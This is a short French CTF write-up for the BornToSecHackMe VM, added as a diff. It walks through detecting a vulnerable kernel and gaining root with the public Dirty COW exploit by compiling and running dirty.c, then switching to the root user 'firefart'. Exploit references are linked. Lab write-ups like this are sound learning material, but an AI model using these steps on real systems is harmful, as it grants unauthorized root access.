@@ -1,1 +1,33 @@
-# 
+# Writeup2
+
+## 1. Version du noyau
+```sh
+uname -r
+
+zaz@BornToSecHackMe:~$ uname -r
+3.2.0-91-generic-pae
+```
+
+"Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)" fait référence à une vulnérabilité de type escalade de privilèges (privilege escalation) qui a affecté certaines versions du noyau Linux entre la version 2.6.22 et 3.9
+* Donc la version du systeme est vulnérable à dirtycow
+
+
+## 2. Ajout du programme, compilation puis exécution du binaire
+1. On compile
+2. On exécute
+3. On choisit le mot de passe
+```
+scp dirty.c  zaz@192.168.56.101:/home/zaz/dirty.c
+gcc -pthread dirty.c -o dirty -lcrypt
+ssh zaz@192.168.56.101
+./dirty
+```
+## 3. Connexion
+* L'exploit crée un utilisateur firefart qui sera root
+```
+ su firefart
+ id
+```
+## Resources 
+* https://www.exploit-db.com/exploits/40839
+* https://github.com/firefart/dirtycow
